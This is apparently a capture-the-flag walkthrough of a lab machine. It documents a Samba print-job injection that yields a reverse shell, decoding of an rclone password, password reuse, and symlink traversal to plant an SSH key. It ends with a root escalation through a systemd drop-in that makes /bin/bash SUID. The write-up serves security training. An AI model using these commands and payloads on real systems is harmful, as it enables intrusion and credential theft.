### 1. Reconnaissance

Initial port scan with Nmap:

```
nmap -sV abducted.htb

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
53/tcp  open  domain?
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```

The attack surface is narrow: SSH and Samba. No web service exposed.

---

### 2. Enumeration

#### SMB Share Enumeration

Listing available shares anonymously:

```
smbclient -L //abducted.htb -N

Sharename       Type      Comment
---------       ----      -------
HP-Reception    Printer   Reception printer
projects        Disk      Hartley Group Project Files
transfer        Disk      Staff file transfer
IPC$            IPC       IPC Service (Hartley Group Document Services)
```

A printer share (`HP-Reception`) is exposed with guest access. Samba 4 with an exposed printer queue is a known attack vector — CVE-2026-4480 exploits the `%J` macro in the `print command` directive to achieve unauthenticated RCE.

---

### 3. Foothold — CVE-2026-4480 (Samba %J Injection → RCE)

CVE-2026-4480 abuses the `print command` directive in Samba. When a print job is submitted, Samba expands `%J` to the job name and passes it to the shell. By naming the job `|sh`, the print job body (sent via `WritePrinter`) is piped directly into a shell — yielding unauthenticated RCE as the Samba guest user.

Starting a listener:

```bash
nc -lvnp 4444
```

Running the exploit:

```bash
python3 "CVE-2026-4480 Exploit.py" 10.129.244.177 10.10.17.186 4444 -P ""
[*] target   : 10.129.244.177
[+] print job submitted
```

Reverse shell received:

```
nobody@abducted:/var/spool/samba$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

---

### 4. Post-Exploitation Enumeration (as nobody)

#### Credential Discovery

Enumerating `/opt/offsite-backup/` revealed an rclone SFTP configuration:

```
nobody@abducted:/opt/offsite-backup$ cat rclone.conf

[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
```

The password is obfuscated with rclone's built-in XOR-based encoding, reversible in place:

```
nobody@abducted$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

#### Samba Configuration

Reading `/etc/samba/smb.conf` and `/etc/samba/shares.conf` revealed two additional misconfigurations:

```ini
# smb.conf
unix extensions = no
allow insecure wide links = yes

# shares.conf
[transfer]
   path = /srv/transfer
   force user = marcus
   read only = no
   wide links = yes        ← symlink traversal enabled
```

With `wide links = yes`, `unix extensions = no`, and `allow insecure wide links = yes` all set, the `transfer` share will follow symlinks outside its root and serve their contents — as `marcus` due to `force user`.

---

### 5. Lateral Movement — nobody → scott

The rclone password was reused for the local user `scott`:

```
nobody@abducted$ su - scott
Password: iXzvcib3SrpZ

scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
```

---

### 6. User Flag

```
scott@abducted:~$ cat /home/scott/user.txt
2f0f68503858eff8ab7d8a9cf6975948
```

---

### 7. Lateral Movement — scott → marcus (Samba Wide Links Attack)

Since scott owns `/srv/transfer`, a symlink to the filesystem root can be created inside the share:

```bash
ln -s / /srv/transfer/pwned
```

Connecting via smbclient and traversing the symlink:

```
smbclient //abducted.htb/transfer -U scott

smb: \> cd pwned
smb: \pwned\> ls
  etc   home   root   srv   ...
```

All operations inside the share run as `marcus`. An SSH public key is planted directly into marcus's home directory:


```bash
# On attacker machine
echo "ssh-rsa AAAA...sam@mac-4.home" > /tmp/authorized_keys
```

```
smb: \pwned\home\marcus\> mkdir .ssh
smb: \pwned\home\marcus\.ssh\> put /tmp/authorized_keys authorized_keys
```

SSH connection as marcus:

```bash
ssh marcus@abducted.htb

marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

---

### 8. Privilege Escalation — marcus → root (systemd Drop-in Abuse)

#### operators Group

Checking group membership revealed marcus belongs to `operators`. Searching for files owned by this group:

```bash
find / -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d
```

The `operators` group owns the systemd drop-in directory for `smbd`, with the setgid bit set — any file created inherits the group, and marcus can write to it:

```bash
ls -la /etc/systemd/system/smbd.service.d/
drwxrws--- 2 root operators 4096 Jun  4 13:41 .
```

#### Injecting a Malicious Drop-in

Systemd drop-in files extend existing service unit definitions. An `ExecStartPost` directive executes an arbitrary command as `root` when `smbd` restarts:

```bash
cat > /etc/systemd/system/smbd.service.d/pwn.conf << EOF
[Service]
ExecStartPost=/bin/bash -c 'chmod +s /bin/bash'
EOF

systemctl daemon-reload
systemctl restart smbd
```

`/bin/bash` is now SUID:

```bash
/bin/bash -p

bash-5.2# id
uid=1001(marcus) gid=1002(marcus) euid=0(root) egid=0(root)
```

---

### 9. Root Flag

```
bash-5.2# cat /root/root.txt
d3a829fd52187d55cb19dc5dea5b4218
```
